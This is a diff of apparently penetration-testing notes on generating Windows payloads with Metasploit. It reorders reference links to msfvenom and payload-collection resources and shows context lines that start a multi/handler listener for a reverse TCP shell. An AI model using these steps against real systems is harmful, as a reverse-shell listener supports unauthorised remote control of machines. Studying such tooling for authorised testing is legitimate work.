@@ -3,8 +3,10 @@ https://netsec.ws/?p=331
 https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/  
 https://github.com/nccgroup/Winpayloads  
 https://github.com/xephora/PayloadsAllTheThings  
+https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom  
+https://www.offensive-security.com/metasploit-unleashed/fun-incognito/  
 
-[Generating Payloads on Windows using Metasploit]
+# [Generating Payloads on Windows using Metasploit]
 
 ### [Regular Reverse TCP]
 ```
@@ -37,7 +39,4 @@ msf5 exploit(multi/handler) > set LPORT 32119
 LPORT => 32119
 
 msf5 exploit(multi/handler) > run
-
-https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
-https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
 
